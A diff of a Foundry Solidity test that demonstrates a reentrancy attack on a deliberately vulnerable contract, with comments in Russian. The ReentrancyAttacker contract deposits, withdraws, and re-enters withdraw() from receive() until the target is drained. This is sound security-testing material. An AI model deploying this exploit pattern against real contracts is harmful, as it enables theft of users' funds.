@@ -1,46 +1,45 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+
 import "forge-std/Test.sol";
-import "../contracts/ReentrancyVuln.sol";
+import "../src/ReentrancyVuln.sol";
 
 contract ReentrancyTest is Test {
     ReentrancyVuln vulnerableContract;
-    address attacker = address(0xBEEF);
-    address victim = address(0xCAFE);
+    address payable attacker = payable(address(0xBEEF));
 
     function setUp() public {
         vulnerableContract = new ReentrancyVuln();
         vm.deal(attacker, 10 ether);
-        vm.deal(victim, 10 ether);
-
-        vm.prank(victim);
-        vulnerableContract.deposit{value: 1 ether}();
     }
 
     function testReentrancyAttack() public {
         vm.startPrank(attacker);
-        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vulnerableContract));
+        payable(address(vulnerableContract)).transfer(2 ether); // ✅ Депозит в контракт
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(payable(address(vulnerableContract)));
         attackerContract.attack{value: 1 ether}();
         vm.stopPrank();
 
-       assertEq(address(vulnerableContract).balance, 0, "Reentrancy attack successful");
- }
+        assertEq(address(vulnerableContract).balance, 0, "Reentrancy attack failed");
+    }
 }
 
+// Атакующий контракт
 contract ReentrancyAttacker {
-    ReentrancyVuln public target;
+    ReentrancyVuln target;
 
-    constructor(address _target) {
+    constructor(address payable _target) {  // ✅ Делаем _target "payable"
         target = ReentrancyVuln(_target);
-    }
-
-    function attack() public payable {
-        target.withdraw();
     }
 
     receive() external payable {
         if (address(target).balance > 0) {
             target.withdraw();
         }
+    }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.withdraw();
     }
 }
